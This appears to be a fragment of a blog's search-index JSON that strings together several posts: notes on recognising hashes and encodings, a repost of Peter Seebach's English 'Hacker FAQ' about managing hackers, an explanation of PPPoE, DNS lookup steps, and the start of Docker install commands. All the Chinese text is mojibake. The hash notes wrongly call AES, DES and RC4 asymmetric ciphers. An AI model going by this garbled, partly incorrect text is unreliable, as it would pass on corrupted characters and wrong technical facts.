123456789101112131415161718192021md5 16ä½å’Œ32ä½ 0-9 å’Œa-f ç»„æˆçš„å­—ç¬¦ä¸² è§£å¯†ï¼š 1.çŸ¥é“ç®—æ³• 2.ç¢°æ’æšä¸¾ç”Ÿæˆå¯†æ–‡ æœ‰ç‰¹æ®Šæƒ…å†µã€‚md5ä¼šåŠ saltä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ discuzSHA1å’Œmd5ç‰¹å¾å·®ä¸å¤šï¼Œåªæ˜¯ä½æ•°æ˜¯40NTLMWINDOWSç³»ç»Ÿå“ˆå¸Œå¯†ç ï¼Œæ ‡å‡†é€šè®¯å®‰å…¨åè®®win7ä¹‹åä½¿ç”¨çš„å¯†ç ä¹‹å‰æ˜¯LMaesï¼Œdesï¼Œrc4éƒ½æ˜¯éå¯¹ç§°åŠ å¯†ã€‚å°åº¦å¯†é’¥ï¼Œå¯†æ–‡ç‰¹è´¨ä¸base64ç±»ä¼¼ å¤§å°å†™æ•æ„Ÿ 123456base64 é€šå¸¸ä»¥=ç»“å°¾ã€1-9 a-furl é€šå¸¸ä»¥=ç»“å°¾ã€1-9 a-f é€šå¸¸ä»¥%æ•°å­—å­—æ¯åˆ†å‰² ç¼–ç gbkï¼Œutf-8 é¢œæ–‡å­—åŠ å¯†ï¼šaaencode12jotherï¼š +()[]&#123;&#125;jsfuckæ˜¯å’Œjotherå¾ˆåƒã€‚å°‘äº†&#123;&#125; å›¾ç‰‡é‡ŒåŒ…å«æ–‡ä»¶çš„æŠ€æœ¯","categories":[],"tags":[]},{"title":"ã€è½¬è½½ã€‘hacker","slug":"ã€è½¬è½½ã€‘hacker","date":"2023-12-24T07:30:16.000Z","updated":"2023-12-24T17:37:53.437Z","comments":true,"path":"2023/12/24/ã€è½¬è½½ã€‘hacker/","link":"","permalink":"http://example.com/2023/12/24/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91hacker/","excerpt":"NEWS!A version of this has been bought by IBM DeveloperWorks.","text":"NEWS!A version of this has been bought by IBM DeveloperWorks. Furthermore, IBM sponsored another article, the Manager FAQ, a guide to managers for hackers who are frustrated and confused by corporate life. Iâ€™d like to thank IBM for their kind support of this project. Iâ€™m pretty happy with the new piece, and Iâ€™m glad to have finally been nudged into posting it. Iâ€™d like to point out how reasonable and friendly IBM has been about this; compare with the way that CRC has treated Eric Weisstein. I have a Powellâ€™s â€œbookshelfâ€, which is sort of a list of recommended books; some are fairly relevant to this page. Look! Books! The Hacker FAQThe following list is an attempt to cover some of the issues that will invariably come up when people without previous experience of the hacker community try to hire a hacker. This FAQ is intended for free distribution, and may be copied as desired. It is in an early revision. If you wish to modify the FAQ, or distribute it for publication, please contact the author. The author is &#x73;&#x65;&#101;&#x62;&#115;&#64;&#112;&#x6c;&#x65;&#x74;&#x68;&#x6f;&#114;&#x61;&#46;&#110;&#x65;&#116;. The official distribution site (as of revision 0.05) is â€œhttp://www.plethora.net/~seebs/faqs/hacker.htmlâ€œ. DISCLAIMER: The author is a hacker. Bias is inevitable. This document is copyright 1995, 1996, 1998, 1999 Peter Seebach. Unaltered distribution is permitted. Revision 0.05 - Last modified September 28, 1999 Questions and Answers:Section 0: Basic understanding.0.0: Wonâ€™t my hacker break into my computer and steal my trade secrets?No. Hackers arenâ€™t, contrary to media reporting, the people who break into computers. Those are crackers. Hackers are people who enjoy playing with computers. Your hacker may occasionally circumvent security measures, but this is not malicious; she just does it when the security is in her way, or because sheâ€™s curious.0.1: Was it a good idea to hire a hacker?It depends on the job. A hacker can be dramatically more effective than a non-hacker at a job, or dramatically less effective. Jobs where hackers are particularly good are:Systems administrationProgrammingDesignJobs where hackers are particularly bad are: Data entryMore generally, a job that requires fast and unexpected changes, significant skill, and is not very repetitive will be one a hacker will excel at. Repetitive, simple jobs are a waste of a good hacker, and will make your hacker bored and frustrated. No one works well bored and frustrated. The good news is, if you get a hacker on something he particularly likes, you will frequently see performance on the order of five to ten times what a â€œnormalâ€ worker would produce. This is not consistent, and you shouldnâ€™t expect to see it all the time, but it will happen. This is most visible on particularly difficult tasks. 0.2: How should I manage my hacker?The same way you herd cats. It can be a bit confusing; theyâ€™re not like most other workers. Donâ€™t worry! Your hacker is likely to be willing to suggest answers to problems, if asked. Most hackers are nearly self-managing.0.3: Wait, you just said â€œ10 timesâ€, didnâ€™t you? Youâ€™re not serious, right?Actually, I said â€œten timesâ€. And yes, I am serious; a hacker on a roll may be able to produce, in a period of a few months, something that a small development group (say, 7-8 people) would have a hard time getting together over a year. He also may not. Your mileage will vary.IBM used to report that certain programmers might be as much as 100 times as productive as other workers, or more. This kind of thing happens. 0.4: I donâ€™t understand this at all. This is confusing. Is there a book on this?Not yet. In the meantime, check out The New Hackerâ€™s Dictionary (references below; also known as â€œthe jargon fileâ€), in particular some of the appendices. The entire work is full of clarifications and details of how hackers think.Section 1: Social issues1.0: My hacker doesnâ€™t fit in well with our corporate society. She seems to do her work well, but sheâ€™s not really making many friends.This is common. Your hacker may not have found any people around who get along with hackers. You may wish to consider offering her a position telecommuting, or flexible hours (read: night shift), which may actually improve her productivity. Or hire another one.1.1: My hacker seems to dress funny. Is there any way to impress upon him the importance of corporate appearance?Your hacker has a very good understanding of the importance of corporate appearance. It doesnâ€™t help you get your job done. IBM, Ford, and Microsoft have all realized that people work better when they can dress however they want. Your hacker is dressed comfortably. A polite request to dress up some for special occasions may well be honored, and most hackers will cheerfully wear clothes without (unintentional) holes in them if specifically asked.1.2: My hacker wonâ€™t call me by my title, and doesnâ€™t seem to respect me at all.Your hacker doesnâ€™t respect your title. Hackers donâ€™t believe that management is â€œaboveâ€ engineering; they believe that management is doing one job, and engineering is doing another. They may well frequently talk as if management is beneath them, but this is really quite fair; your question implies that you talk as if engineering is beneath you. Treat your hacker as an equal, and she will probably treat you as an equal â€“ quite a compliment!1.3: My hacker constantly insults the work of my other workers.Take your hacker aside, and ask for details of whatâ€™s wrong with the existing work. It may be that thereâ€™s something wrong with it. Donâ€™t let the fact that it runs most of the time fool you; your hacker is probably bothered by the fact that it crashes at all. He may be able to suggest improvements which could dramatically improve performance, reliability, or other features. Itâ€™s worth looking into.You may be able to convince your hacker to be more polite, but if there appear to be major differences, itâ€™s quite possible that one or more of your existing staff are incompetent. Note that hackers, of course, have different standards of competence than many other people. (Read â€œdifferentâ€ as â€œmuch higherâ€.) Section 2: Productivity.2.0: My hacker plays video games on company time.Hackers, writers, and painters all need some amount of time to spend â€œpercolatingâ€ â€“ doing something else to let their subconscious work on a problem. Your hacker is probably stuck on something difficult. Donâ€™t worry about it.2.1: But itâ€™s been two weeks since I saw anything!Your hacker is working, alone probably, on a big project, and just started, right? Sheâ€™s probably trying to figure it all out in advance. Ask her how itâ€™s going; if she starts a lot of sentences, but interrupts them all with â€œno, waitâ€¦â€ or â€œdrat, that wonâ€™t workâ€, itâ€™s going well.2.2: Isnâ€™t this damaging to productivity?No. Your hacker needs to recreate and think about things in many ways. He will be more productive with this recreation than without it. Your hacker enjoys working; donâ€™t worry about things getting done reasonably well and quickly.2.3: My hacker is constantly doing things unrelated to her job responsibilities.Do they need to be done? Very few hackers can resist solving a problem when they can solve it, and no one else is solving it. For that matter, is your hacker getting her job done? If so, consider these other things a freebie or perk (for you). Although it may not be conventional, itâ€™s probably helping out quite a bit.2.4: My hacker is writing a book, reading USENET news, playing video games, talking with friends on the phone, and building sculptures out of paper clips. On company time!He sounds happy. The chances are heâ€™s in one of three states:Basic job responsibilities are periodic (phone support, documentation, et al.) and thereâ€™s a lull in incoming work. Donâ€™t worry about it!Your hacker is stuck on a difficult problem.Your hacker is bored silly and is trying to find amusement. Perhaps you should find him more challenging work?Any of these factors may be involved. All of them may be involved. In general, if the work is challenging, and is getting done, donâ€™t worry too much about the process. You might ask for your corporation to be given credit in the book. 2.5: But my other workers are offended by my hackerâ€™s success, and it hurts their productivity.Do you really need to have workers around who would rather be the person getting something done, than have it done already? Ego has very little place in the workplace. If they canâ€™t do it well, assign them to something they can do.Section 3: Stimulus and response3.0: My hacker did something good, and I want to reward him.Good! Here are some of the things most hackers would like to receive in exchange for their work:Respect.Admiration.Compliments.Understanding.Discounts on expensive toys.Money.These are not necessarily in order. The 4th item (understanding) is the most difficult. Try to remember this good thing your hacker just did the next time you discover he just spent a day playing x-trek. Rather than complaining about getting work done, write it off as â€œa perkâ€ that was granted (informally) as a bonus for a job well done. Donâ€™t worry; hackers get bored quickly when they arenâ€™t doing their work. 3.1: My hacker did something bad, and I want to punish him.Donâ€™t. 30 years of psychological research has shown that punishment has no desirable long-term effects. Your hacker is not a lab rat. (Even if he were a lab rat, punishment wouldnâ€™t work; at least, not if he were one of the sorts of lab rats the psych research was done on.) If you donâ€™t like something your hacker is doing, express your concerns. Explain what it is that bothers you about the behavior.Be prepared for an argument; your hacker is a rational entity, and presumably had reasons. Donâ€™t jump on him too quickly; they may turn out to be good reasons. Donâ€™t be afraid to apologize if youâ€™re wrong. If your hacker admits to having been wrong, donâ€™t demand an apology; so far as the hacker is concerned, admitting to being wrong is an apology, most likely. 3.2: I donâ€™t get it. I offered my hacker a significant promotion, and she turned it down and acted offended.A promotion frequently involves spending more time listening to people describing what theyâ€™re doing, and less time playing with computers. Your hacker is enjoying her work; if you want to offer a reward, consider an improvement in title, a possible raise, and some compliments. Make sure your hacker knows you are pleased with her accomplishments â€“ thatâ€™s what sheâ€™s there for.3.3: My company policy wonâ€™t let me give my hacker any more raises until heâ€™s in management.Your company policy is broken. A hacker can earn as much as $200 an hour (sometimes more) doing freelance consulting. You may wish to offer your hacker a contracted permanent consulting position with benefits, or otherwise find loopholes. Or, find perks to offer - many hackers will cheerfully accept a discount on hardware from their favorite manufacturer as an effective raise.3.4: I canâ€™t believe the hacker on my staff is worth as much as weâ€™re paying.Ask the other staff in the department what the hacker does, and what they think of it. The chances are that your hacker is spending a few hours a week answering arcane questions that would otherwise require an expensive external consultant. Your hacker may be fulfilling another jobâ€™s worth of responsibilities in his spare time around the office. Very few hackers arenâ€™t worth what theyâ€™re getting paid; they enjoy accomplishing difficult tasks, and improving worker efficiency.Section 4: What does that mean?4.0: My hacker doesnâ€™t speak English. At least, I donâ€™t think so.Your hacker is a techie. Your best bet is to pick up a copy of TNHD (The New Hackerâ€™s Dictionary). It can be found as http://catb.org/esr/jargon (last I checked) or from a good bookstore. If you have trouble understanding that reference, ask your hacker if she has a copy, or would be willing to explain her terms. Most hackers are willing to explain terms. Be ready for condescension; itâ€™s not intended as an insult, but if you donâ€™t know the words, she probably has to talk down to you at first to explain them.Itâ€™s a reasonably difficult set of words; there are a lot of them, and their usage is much more precise than it sounds. Hackers love word games. [It is also possible that English is not your hackerâ€™s native language, and that itâ€™s not yours either. Feel free to substitute a more appropriate language.] 4.1: I canâ€™t get an estimate out of my hacker.Your hacker hasnâ€™t figured out how hard the problem is yet. Unlike most workers, hackers will try very hard to refuse to give an estimate until they know for sure that they understand the problem. This may include solving it.No good engineer goes beyond 95% certainty. Most hackers are good engineers. If you say you will not try to hold him to the estimate (and mean it!) you are much more likely to get an approximate estimate. The estimate may sound very high or very low; it may be very high or very low. Still, itâ€™s an estimate, and you get what you ask for. 4.2: My hacker makes obscure, meaningless jokes.If you feel brave, ask for an explanation. Most of them can be explained. It may take a while, but it may prove interesting.4.3: My hacker counts from zero.So does the computer. You can hide it, but computers count from zero. Most hackers do by habit, also.If you found this information useful, please consider sending a token donation to the author; email for details. You might also consider buying a couple of books through my â€œaffiliate programâ€ link; you get cool books, I get pocket change. :) Recommended books:The links in this section will all try to take you to Powellâ€™s, where you can spend your money on cool books. The Cathedral &amp; the Bazaar (Eric Raymond) - a discussion of different ways of building systems. The New Hackerâ€™s Dictionary (Eric Raymond) - a great source of trivia, lore, and translations for difficult concepts. (Not always in stock, Iâ€™m afraid.) https://www.seebs.net/faqs/hacker.html","categories":[],"tags":[]},{"title":"å…³äºå…‰çŒ«æŠ˜è…¾","slug":"å…³äºå…‰çŒ«æŠ˜è…¾","date":"2023-12-23T17:15:40.000Z","updated":"2023-12-24T18:48:51.140Z","comments":true,"path":"2023/12/24/å…³äºå…‰çŒ«æŠ˜è…¾/","link":"","permalink":"http://example.com/2023/12/24/%E5%85%B3%E4%BA%8E%E5%85%89%E7%8C%AB%E6%8A%98%E8%85%BE/","excerpt":"pppoe12345PPP over Ethernetï¼Œæ•°å­—ç”¨æˆ·çº¿è·¯DSLï¼ˆDigital Subscriber Lineï¼‰æ˜¯ä»¥ç”µè¯çº¿ä¸ºä¼ è¾“ä»‹è´¨çš„ä¼ è¾“æ•°å­—ä¿¡å·çš„æŠ€æœ¯ï¼Œäººä»¬é€šå¸¸æŠŠæ‰€æœ‰çš„DSLæŠ€æœ¯ç»Ÿç§°ä¸ºxDSLï¼Œxä»£è¡¨ä¸åŒç§ç±»çš„æ•°å­—ç”¨æˆ·çº¿è·¯æŠ€æœ¯ã€‚ç›®å‰æ¯”è¾ƒæµè¡Œçš„å®½å¸¦æ¥å…¥æŠ€æœ¯ä¸ºADSLï¼ŒADSLæ—¶éå¯¹ç§°DSLæŠ€æœ¯ï¼Œä½¿ç”¨æ˜¯PPPoEåè®®ã€‚PPPoEåè®®é€šè¿‡åœ¨ä»¥å¤ªç½‘ä¸Šæä¾›ç‚¹åˆ°ç‚¹çš„è¿æ¥ï¼Œå»ºç«‹PPPä¼šè¯ï¼Œä½¿çš„ä»¥å¤ªç½‘ä¸­çš„ä¸»æœºèƒ½å¤Ÿè¿æ¥åˆ°è¿œç«¯çš„å®½å¸¦æ¥å…¥æœåŠ¡å™¨ä¸Šã€‚PPPoEå…·æœ‰ä½¿ç”¨èŒƒå›´å¹¿ã€å®‰å…¨æ–°é«˜ã€è®¡è´¹æ–¹ä¾¿ç­‰ç‰¹ç‚¹ã€‚PPPä¸ºäºŒå±‚åè®®ï¼ŒEthernetä¸ºäºŒå±‚åè®®ï¼ŒPPPoEä¸ºå°†Ethernetè·‘åœ¨PPPçš„åè®®ä¹‹ä¸Šï¼ŒPPPæŠ¥æ–‡å…·æœ‰è®¤è¯åŠŸèƒ½ï¼Œæ‰€ä»¥å°†PPPå°è£…ä»¥å¤ªç½‘åŒ…ä¸­ï¼Œè®©PPPåè®®åœ¨ä»¥å¤ªç½‘ç¯å¢ƒä¸­å¯¹è®¾å¤‡è¿›è¡Œè®¤è¯ã€è®¡è´¹ç­‰åŠŸèƒ½ï¼Œè€ŒPPPä¸æ”¯æŒå¹¿æ’­å‘é€çš„èƒ½åŠ›ï¼Œæ‰€ä»¥ä¸èƒ½å®ŒæˆPPOEè®¤è¯çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥å°†PPPè·‘åœ¨Enternetä¹‹ä¸Šï¼Œä½¿ç”¨PPPè¿›è¡Œè®¤è¯å’ŒIPåœ°å€çš„åˆ†å‘ï¼Œä½¿ç”¨EnternetæŠ€æœ¯å®ç°å¹¿æ’­çš„å‘é€ã€‚","text":"pppoe12345PPP over Ethernetï¼Œæ•°å­—ç”¨æˆ·çº¿è·¯DSLï¼ˆDigital Subscriber Lineï¼‰æ˜¯ä»¥ç”µè¯çº¿ä¸ºä¼ è¾“ä»‹è´¨çš„ä¼ è¾“æ•°å­—ä¿¡å·çš„æŠ€æœ¯ï¼Œäººä»¬é€šå¸¸æŠŠæ‰€æœ‰çš„DSLæŠ€æœ¯ç»Ÿç§°ä¸ºxDSLï¼Œxä»£è¡¨ä¸åŒç§ç±»çš„æ•°å­—ç”¨æˆ·çº¿è·¯æŠ€æœ¯ã€‚ç›®å‰æ¯”è¾ƒæµè¡Œçš„å®½å¸¦æ¥å…¥æŠ€æœ¯ä¸ºADSLï¼ŒADSLæ—¶éå¯¹ç§°DSLæŠ€æœ¯ï¼Œä½¿ç”¨æ˜¯PPPoEåè®®ã€‚PPPoEåè®®é€šè¿‡åœ¨ä»¥å¤ªç½‘ä¸Šæä¾›ç‚¹åˆ°ç‚¹çš„è¿æ¥ï¼Œå»ºç«‹PPPä¼šè¯ï¼Œä½¿çš„ä»¥å¤ªç½‘ä¸­çš„ä¸»æœºèƒ½å¤Ÿè¿æ¥åˆ°è¿œç«¯çš„å®½å¸¦æ¥å…¥æœåŠ¡å™¨ä¸Šã€‚PPPoEå…·æœ‰ä½¿ç”¨èŒƒå›´å¹¿ã€å®‰å…¨æ–°é«˜ã€è®¡è´¹æ–¹ä¾¿ç­‰ç‰¹ç‚¹ã€‚PPPä¸ºäºŒå±‚åè®®ï¼ŒEthernetä¸ºäºŒå±‚åè®®ï¼ŒPPPoEä¸ºå°†Ethernetè·‘åœ¨PPPçš„åè®®ä¹‹ä¸Šï¼ŒPPPæŠ¥æ–‡å…·æœ‰è®¤è¯åŠŸèƒ½ï¼Œæ‰€ä»¥å°†PPPå°è£…ä»¥å¤ªç½‘åŒ…ä¸­ï¼Œè®©PPPåè®®åœ¨ä»¥å¤ªç½‘ç¯å¢ƒä¸­å¯¹è®¾å¤‡è¿›è¡Œè®¤è¯ã€è®¡è´¹ç­‰åŠŸèƒ½ï¼Œè€ŒPPPä¸æ”¯æŒå¹¿æ’­å‘é€çš„èƒ½åŠ›ï¼Œæ‰€ä»¥ä¸èƒ½å®ŒæˆPPOEè®¤è¯çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥å°†PPPè·‘åœ¨Enternetä¹‹ä¸Šï¼Œä½¿ç”¨PPPè¿›è¡Œè®¤è¯å’ŒIPåœ°å€çš„åˆ†å‘ï¼Œä½¿ç”¨EnternetæŠ€æœ¯å®ç°å¹¿æ’­çš„å‘é€ã€‚ ç›®çš„12345## è¿è¥å•†å¸Œæœ›æŠŠä¸€ä¸ªç«™ç‚¹ä¸Šçš„å¤šå°ä¸»æœºè¿æ¥åˆ°åŒä¸€å°è¿œç¨‹æ¥å…¥è®¾å¤‡ï¼ŒåŒæ—¶æ¥å…¥è®¾å¤‡èƒ½å¤Ÿæä¾›ä¸æ‹¨å·ä¸Šç½‘ç±»ä¼¼çš„è®¿é—®æ§åˆ¶å’Œè®¡è´¹åŠŸèƒ½ã€‚åœ¨ä¼—å¤šçš„æ¥å…¥æŠ€æœ¯ä¸­ï¼ŒæŠŠå¤šä¸ªä¸»æœºè¿æ¥åˆ°æ¥å…¥è®¾å¤‡çš„æœ€ç»æµçš„æ–¹æ³•å°±æ˜¯ä»¥å¤ªç½‘ï¼Œè€ŒPPPåè®®å¯ä»¥æä¾›è‰¯å¥½çš„è®¿é—®æ§åˆ¶å’Œè®¡è´¹åŠŸèƒ½ï¼Œäºæ˜¯äº§ç”Ÿäº†åœ¨ä»¥å¤ªç½‘ä¸Šä¼ è¾“PPPæŠ¥æ–‡çš„æŠ€æœ¯ï¼Œå³PPPoEã€‚PPPoEåˆ©ç”¨ä»¥å¤ªç½‘å°†å¤§é‡ä¸»æœºç»„æˆç½‘ç»œï¼Œé€šè¿‡ä¸€ä¸ªè¿œç«¯æ¥å…¥è®¾å¤‡è¿å…¥å› ç‰¹ç½‘ï¼Œå¹¶è¿ç”¨PPPåè®®å¯¹æ¥å…¥çš„æ¯ä¸ªä¸»æœºè¿›è¡Œæ§åˆ¶ï¼Œå…·æœ‰é€‚ç”¨èŒƒå›´å¹¿ã€å®‰å…¨æ€§é«˜ã€è®¡è´¹æ–¹ä¾¿çš„ç‰¹ç‚¹ 3.PPPoEæ‹¨å·çš„è¿‡ç¨‹ 3.1.Discoveryé˜¶æ®µ1)PPPoE Clientå¹¿æ’­å‘é€ä¸€ä¸ªPADIï¼ˆPPPoE Active Discovery Initialï¼‰æŠ¥æ–‡ï¼Œåœ¨æ­¤æŠ¥æ–‡ä¸­åŒ…å«PPPoE Clientæƒ³è¦å¾—åˆ°çš„æœåŠ¡ç±»å‹ä¿¡æ¯ã€‚ 2)æ‰€æœ‰çš„PPPoE Serveræ”¶åˆ°PADIæŠ¥æ–‡ä¹‹åï¼Œå°†å…¶ä¸­è¯·æ±‚çš„æœåŠ¡ä¸è‡ªå·±èƒ½å¤Ÿæä¾›çš„æœåŠ¡è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå¯ä»¥æä¾›ï¼Œåˆ™å•æ’­å›å¤ä¸€ä¸ªPADOï¼ˆPPPoE Active Discovery Offerï¼‰æŠ¥æ–‡ã€‚ 3)æ ¹æ®ç½‘ç»œçš„æ‹“æ‰‘ç»“æ„ï¼ŒPPPoE Clientå¯èƒ½æ”¶åˆ°å¤šä¸ªPPPoE Serverå‘é€çš„PADOæŠ¥æ–‡ï¼ŒPPPoE Clienté€‰æ‹©æœ€å…ˆæ”¶åˆ°çš„PADOæŠ¥æ–‡å¯¹åº”çš„PPPoE Serveråšä¸ºè‡ªå·±çš„PPPoE Serverï¼Œå¹¶å•æ’­å‘é€ä¸€ä¸ªPADRï¼ˆPPPoE Active Discovery Requestï¼‰æŠ¥æ–‡ã€‚ 4)PPPoE Serveräº§ç”Ÿä¸€ä¸ªå”¯ä¸€çš„ä¼šè¯IDï¼ˆSession IDï¼‰ï¼Œæ ‡è¯†å’ŒPPPoE Clientçš„è¿™ä¸ªä¼šè¯ï¼Œé€šè¿‡å‘é€ä¸€ä¸ªPADSï¼ˆPPPoE Active Discovery Session-confirmationï¼‰æŠ¥æ–‡æŠŠä¼šè¯IDå‘é€ç»™PPPoE Clientï¼Œä¼šè¯å»ºç«‹æˆåŠŸåä¾¿è¿›å…¥PPPoE Sessioné˜¶æ®µã€‚ å®Œæˆä¹‹åé€šä¿¡åŒæ–¹éƒ½ä¼šçŸ¥é“PPPoEçš„Session_IDä»¥åŠå¯¹æ–¹çš„ä»¥å¤ªç½‘åœ°å€ï¼Œå®ƒä»¬å…±åŒç¡®å®šäº†å”¯ä¸€çš„PPPoE Sessionã€‚ 3.2.Sessioné˜¶æ®µPPPoE Sessionä¸Šçš„PPPåå•†å’Œæ™®é€šçš„PPPåå•†æ–¹å¼ä¸€è‡´ï¼Œåˆ†ä¸ºLCPã€è®¤è¯ã€NCPä¸‰ä¸ªé˜¶æ®µã€‚ 1)LCPé˜¶æ®µä¸»è¦å®Œæˆå»ºç«‹ã€é…ç½®å’Œæ£€æµ‹æ•°æ®é“¾è·¯è¿æ¥ã€‚ 2)LCPåå•†æˆåŠŸåï¼Œå¼€å§‹è¿›è¡Œè®¤è¯ï¼Œè®¤è¯åè®®ç±»å‹ç”±LCPåå•†ç»“æœï¼ˆCHAPæˆ–è€…PAPï¼‰å†³å®šã€‚ 3)è®¤è¯æˆåŠŸåï¼ŒPPPè¿›å…¥NCPé˜¶æ®µã€‚NCPæ˜¯ä¸€ä¸ªåè®®æ—ï¼Œç”¨äºé…ç½®ä¸åŒçš„ç½‘ç»œå±‚åè®®ï¼Œå¸¸ç”¨çš„æ˜¯IPæ§åˆ¶åè®®ï¼ˆIPCPï¼‰ï¼Œå®ƒä¸»è¦è´Ÿè´£åå•†ç”¨æˆ·çš„IPåœ°å€å’ŒDNSæœåŠ¡å™¨åœ°å€ã€‚ PPPoE Sessionçš„PPPåå•†æˆåŠŸåï¼Œå°±å¯ä»¥æ‰¿è½½PPPæ•°æ®æŠ¥æ–‡ã€‚ åœ¨PPPoE Sessioné˜¶æ®µæ‰€æœ‰çš„ä»¥å¤ªç½‘æ•°æ®åŒ…éƒ½æ˜¯å•æ’­å‘é€çš„ã€‚ 3.3.Terminateé˜¶æ®µPPPé€šä¿¡åŒæ–¹å¯ä»¥ä½¿ç”¨PPPåè®®è‡ªèº«æ¥ç»“æŸPPPoEä¼šè¯ï¼Œå½“æ— æ³•ä½¿ç”¨PPPåè®®ç»“æŸä¼šè¯æ—¶å¯ä»¥ä½¿ç”¨PADTï¼ˆPPPoE Active Discovery Terminateï¼‰æŠ¥æ–‡ã€‚ è¿›å…¥PPPoE Sessioné˜¶æ®µåï¼ŒPPPoE Clientå’ŒPPPoE Serveréƒ½å¯ä»¥é€šè¿‡å‘é€PADTæŠ¥æ–‡çš„æ–¹å¼æ¥ç»“æŸPPPoEè¿æ¥ã€‚PADTæ•°æ®åŒ…å¯ä»¥åœ¨ä¼šè¯å»ºç«‹ä»¥åçš„ä»»æ„æ—¶åˆ»å•æ’­å‘é€ã€‚åœ¨å‘é€æˆ–æ¥æ”¶åˆ°PADTåï¼Œå°±ä¸å…è®¸å†ä½¿ç”¨è¯¥ä¼šè¯å‘é€PPPæµé‡äº†ã€‚ ADEL","categories":[],"tags":[]},{"title":"dnsè§£æè¿‡ç¨‹","slug":"dnsè§£æè¿‡ç¨‹","date":"2023-12-23T15:30:18.000Z","updated":"2024-01-21T16:42:57.230Z","comments":true,"path":"2023/12/23/dnsè§£æè¿‡ç¨‹/","link":"","permalink":"http://example.com/2023/12/23/dns%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B/","excerpt":"","text":"æµ‹è¯•ä¸€ä¸‹ dnsè§£æ â€‹ 1.é¦–å…ˆæŸ¥çœ‹æµè§ˆå™¨ç¼“å­˜ã€‚ç¼“å­˜æœ‰æ—¶é—´ä¼šè¿‡æœŸï¼Œå‡ åˆ†é’Ÿæˆ–å‡ å°æ—¶ â€‹ 2.æŸ¥çœ‹æœ¬åœ°çš„c.:&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts â€‹ &#x2F;etc&#x2F;hosts â€‹ 3.æœ¬æœºæ²¡æœ‰å°±ä¼šå‘æœ¬æœºé…ç½®çš„æœ¬åœ°dnsåŸŸåæœåŠ¡å™¨ï¼ˆldnsï¼‰å‘èµ·è¯·æ±‚ã€‚å¦‚æœæ˜¯å­¦æ ¡å°±æ˜¯å­¦æ ¡dnsçˆ¶äº²ï¼Œå¦‚æœæ˜¯å°åŒºè¿æ¥äº’è”ç½‘å°±æ˜¯äº’è”ç½‘æä¾›å•†ï¼Œè”é€šç”µä¿¡çš„dnsæœåŠ¡å™¨ã€‚linuxå¯ä»¥æŸ¥çœ‹ï¼Œ&#x2F;etc&#x2F;resolv.confæŸ¥çœ‹ 4.ldnsä¸èƒ½è§£æï¼Œå°±ç›´æ¥åˆ°è·ŸåŸŸåæœåŠ¡å™¨ã€‚ 5.æ ¹åŸŸåæœåŠ¡å™¨ä¼šç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨ldnsä¸€ä¸ªæ‰€æŸ¥è¯¢çš„ä¸»åŸŸåæœåŠ¡å™¨gtldåœ°å€ã€‚gltdæ˜¯å›½é™…é¡¶çº§åŸŸåæœåŠ¡å™¨ï¼Œcom,cn,org 6.ç„¶åldnsåœ¨æƒ³ä¸Šä¸€æ­¥è¿”å›åŸŸågltdå‘é€è¯·æ±‚ã€‚ 7.gtldè¿”å›åŸŸåå¯¹åº”çš„name serveråŸŸåã€‚ç„¶åæ³¨å†ŒåŸŸåæœåŠ¡å•†è§£æè¯¥åŸŸå 8.name serveråŸŸåæœåŠ¡å™¨ä¼šæŸ¥è¯¢åŸŸåä¸ipå…³ç³»è¡¨ã€‚å°†ipå’Œttlå€¼è¿”å›dnsserver 9.ldnsæ‹¿åˆ°ipä¸ttlä¼šç¼“å­˜ã€‚ç¼“å­˜æœ‰ttlæ§åˆ¶ 10.æŠŠè§£æç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚ç”¨æˆ·æ›´å…·ttlä¹‹åœ¨æœ¬åœ°ç¼“å­˜ç§ã€‚","categories":[],"tags":[]},{"title":"docker","slug":"docker","date":"2023-12-17T11:08:03.000Z","updated":"2023-12-24T17:52:37.754Z","comments":true,"path":"2023/12/17/docker/","link":"","permalink":"http://example.com/2023/12/17/docker/","excerpt":"1.docker12345Docker é€šå¸¸ç”¨æ¥åšä»€ä¹ˆåº”ç”¨åˆ†å‘ã€éƒ¨ç½²ï¼Œæ–¹ä¾¿ä¼ æ’­ç»™ä»–äººå®‰è£…ã€‚ç‰¹åˆ«æ˜¯å¼€æºè½¯ä»¶å’Œæä¾›ç§æœ‰éƒ¨ç½²çš„åº”ç”¨å¿«é€Ÿå®‰è£…æµ‹è¯•/å­¦ä¹ è½¯ä»¶ï¼Œç”¨å®Œå°±ä¸¢ï¼ˆç±»ä¼¼å°ç¨‹åºï¼‰ï¼Œä¸æŠŠæ—¶é—´æµªè´¹åœ¨å®‰è£…è½¯ä»¶ä¸Šã€‚ä¾‹å¦‚ Redis / MongoDB / ElasticSearch / ELKå¤šä¸ªç‰ˆæœ¬è½¯ä»¶å…±å­˜ï¼Œä¸æ±¡æŸ“ç³»ç»Ÿï¼Œä¾‹å¦‚ Python2ã€Python3ï¼ŒRedis4.0ï¼ŒRedis5.0Windows ä¸Šä½“éªŒ/å­¦ä¹ å„ç§ Linux ç³»ç»Ÿ","text":"1.docker12345Docker é€šå¸¸ç”¨æ¥åšä»€ä¹ˆåº”ç”¨åˆ†å‘ã€éƒ¨ç½²ï¼Œæ–¹ä¾¿ä¼ æ’­ç»™ä»–äººå®‰è£…ã€‚ç‰¹åˆ«æ˜¯å¼€æºè½¯ä»¶å’Œæä¾›ç§æœ‰éƒ¨ç½²çš„åº”ç”¨å¿«é€Ÿå®‰è£…æµ‹è¯•/å­¦ä¹ è½¯ä»¶ï¼Œç”¨å®Œå°±ä¸¢ï¼ˆç±»ä¼¼å°ç¨‹åºï¼‰ï¼Œä¸æŠŠæ—¶é—´æµªè´¹åœ¨å®‰è£…è½¯ä»¶ä¸Šã€‚ä¾‹å¦‚ Redis / MongoDB / ElasticSearch / ELKå¤šä¸ªç‰ˆæœ¬è½¯ä»¶å…±å­˜ï¼Œä¸æ±¡æŸ“ç³»ç»Ÿï¼Œä¾‹å¦‚ Python2ã€Python3ï¼ŒRedis4.0ï¼ŒRedis5.0Windows ä¸Šä½“éªŒ/å­¦ä¹ å„ç§ Linux ç³»ç»Ÿ 2.å®‰è£…&amp;ä½¿ç”¨123456sudo pacman -S docker sudo systemctl start dockersudo systemctl enable 